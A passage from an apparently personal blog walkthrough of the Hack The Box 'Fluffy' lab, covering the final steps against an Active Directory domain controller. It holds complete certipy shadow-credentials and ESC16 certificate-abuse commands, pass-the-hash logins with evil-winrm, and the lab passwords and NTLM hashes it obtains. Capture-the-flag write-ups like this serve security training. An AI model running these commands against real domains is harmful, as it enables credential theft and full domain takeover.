+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy shadow auto -u &#x27;p.agila@fluffy.htb&#x27; -p &#x27;prometheusx-303&#x27; -account winrm_svc -dc-ip 10.129.232.88</span><br></pre></td></tr></table></figure>
+
+<p>For the <code>ca_svc</code> account:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy shadow auto -u &#x27;p.agila@fluffy.htb&#x27; -p &#x27;prometheusx-303&#x27; -account ca_svc -dc-ip 10.129.232.88</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/HTB-Fluffy/certipy_shadow-fluffy.png" alt="Certipy shadow credentials attack results"></p>
+<p><strong>Extracted NTLM Hashes:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrm_svc:33bd09dcd697600edf6b3a7af4875767</span><br><span class="line">ca_svc:ca0f4f9e9eb8a092addf53bb03fc98c8</span><br></pre></td></tr></table></figure>
+
+<h3 id="User-Flag-Access"><a href="#User-Flag-Access" class="headerlink" title="User Flag Access"></a>User Flag Access</h3><p>With the <code>winrm_svc</code> hash, we can connect via WinRM and retrieve the user flag from the desktop:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767 -i 10.129.232.88</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Domain-Administrator-Privilege-Escalation"><a href="#Domain-Administrator-Privilege-Escalation" class="headerlink" title="Domain Administrator Privilege Escalation"></a>Domain Administrator Privilege Escalation</h2><h3 id="Certificate-Authority-Enumeration"><a href="#Certificate-Authority-Enumeration" class="headerlink" title="Certificate Authority Enumeration"></a>Certificate Authority Enumeration</h3><p>Using the <code>ca_svc</code> credentials, we scan for vulnerable certificate templates:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -username ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.232.88 -vulnerable</span><br></pre></td></tr></table></figure>
+
+<p>The scan reveals an <strong>ESC16</strong> vulnerability in the certificate templates.</p>
+<h3 id="ESC16-Exploitation"><a href="#ESC16-Exploitation" class="headerlink" title="ESC16 Exploitation"></a>ESC16 Exploitation</h3><p><strong>Step 1:</strong> Update the UPN of <code>ca_svc</code> to <code>administrator</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy account -u &#x27;p.agila&#x27; -p &#x27;prometheusx-303&#x27; -dc-ip 10.129.232.88 -user ca_svc -upn administrator update</span><br></pre></td></tr></table></figure>
+
+<p><strong>Step 2:</strong> Request a certificate for the administrator account:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -ca FLUFFY-DC01-CA -template User -upn administrator -dc-ip 10.129.232.88</span><br></pre></td></tr></table></figure>
+
+<p><strong>Step 3:</strong> Revert the UPN back to normal:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy account -u &#x27;p.agila&#x27; -p &#x27;prometheusx-303&#x27; -dc-ip 10.129.232.88 -user ca_svc -upn ca_svc  update</span><br></pre></td></tr></table></figure>
+
+<p><strong>Step 4:</strong> Authenticate using the certificate to retrieve the administrator hash:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -dc-ip 10.129.232.88 -pfx administrator.pfx -username administrator -domain fluffy.htb</span><br></pre></td></tr></table></figure>
+
+<h3 id="Domain-Administrator-Access"><a href="#Domain-Administrator-Access" class="headerlink" title="Domain Administrator Access"></a>Domain Administrator Access</h3><p>Finally, we use the administrator hash to connect via WinRM and retrieve the root flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -u administrator -H ################# -i 10.129.232.88</span><br></pre></td></tr></table></figure>
+
+<hr>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTB-Fluffy-Complete-Penetration-Testing-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">HTB Fluffy - Complete Penetration Testing Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Reconnaissance"><span class="toc-number">1.2.</span> <span class="toc-text">Initial Reconnaissance</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Starting-Credentials"><span class="toc-number">1.2.1.</span> <span class="toc-text">Starting Credentials</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Port-Scanning"><span class="toc-number">1.2.2.</span> <span class="toc-text">Port Scanning</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB-Enumeration"><span class="toc-number">1.3.</span> <span class="toc-text">SMB Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Guest-Access-Discovery"><span class="toc-number">1.3.1.</span> <span class="toc-text">Guest Access Discovery</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SID-Brute-Force"><span class="toc-number">1.3.2.</span> <span class="toc-text">SID Brute Force</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberoasting-Attack"><span class="toc-number">1.4.</span> <span class="toc-text">Kerberoasting Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Clock-Skew-Fix"><span class="toc-number">1.4.1.</span> <span class="toc-text">Clock Skew Fix</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Extracting-Service-Account-Hashes"><span class="toc-number">1.4.2.</span> <span class="toc-text">Extracting Service Account Hashes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hash-Cracking-Attempt"><span class="toc-number">1.4.3.</span> <span class="toc-text">Hash Cracking Attempt</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bloodhound-Enumeration"><span class="toc-number">1.5.</span> <span class="toc-text">Bloodhound Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB-Share-Exploration"><span class="toc-number">1.6.</span> <span class="toc-text">SMB Share Exploration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Share-Enumeration"><span class="toc-number">1.6.1.</span> <span class="toc-text">Share Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Accessing-the-IT-Share"><span class="toc-number">1.6.2.</span> <span class="toc-text">Accessing the IT Share</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2025-24071-Exploitation"><span class="toc-number">1.7.</span> <span class="toc-text">CVE-2025-24071 Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Vulnerability-Analysis"><span class="toc-number">1.7.1.</span> <span class="toc-text">Vulnerability Analysis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Preparation"><span class="toc-number">1.7.2.</span> <span class="toc-text">Exploit Preparation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NTLM-Hash-Capture"><span class="toc-number">1.7.3.</span> <span class="toc-text">NTLM Hash Capture</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hash-Cracking"><span class="toc-number">1.7.4.</span> <span class="toc-text">Hash Cracking</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-via-Service-Accounts"><span class="toc-number">1.8.</span> <span class="toc-text">Privilege Escalation via Service Accounts</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bloodhound-Path-Analysis"><span class="toc-number">1.8.1.</span> <span class="toc-text">Bloodhound Path Analysis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Adding-User-to-Service-Accounts-Group"><span class="toc-number">1.8.2.</span> <span class="toc-text">Adding User to Service Accounts Group</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shadow-Credentials-Attack"><span class="toc-number">1.8.3.</span> <span class="toc-text">Shadow Credentials Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#User-Flag-Access"><span class="toc-number">1.8.4.</span> <span class="toc-text">User Flag Access</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Administrator-Privilege-Escalation"><span class="toc-number">1.9.</span> <span class="toc-text">Domain Administrator Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Certificate-Authority-Enumeration"><span class="toc-number">1.9.1.</span> <span class="toc-text">Certificate Authority Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC16-Exploitation"><span class="toc-number">1.9.2.</span> <span class="toc-text">ESC16 Exploitation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Domain-Administrator-Access"><span class="toc-number">1.9.3.</span> <span class="toc-text">Domain Administrator Access</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/10/17/HTB-Fluffy/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/10/17/HTB-Fluffy/&text=HTB-Fluffy"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/10/17/HTB-Fluffy/&title=HTB-Fluffy"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/10/17/HTB-Fluffy/&is_video=false&description=HTB-Fluffy"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB-Fluffy&body=Check out this article: http://example.com/2025/10/17/HTB-Fluffy/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/10/17/HTB-Fluffy/&title=HTB-Fluffy"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/10/17/HTB-Fluffy/&title=HTB-Fluffy"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/10/17/HTB-Fluffy/&title=HTB-Fluffy"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/10/17/HTB-Fluffy/&title=HTB-Fluffy"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/10/17/HTB-Fluffy/&name=HTB-Fluffy&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/10/17/HTB-Fluffy/&t=HTB-Fluffy"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2027
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
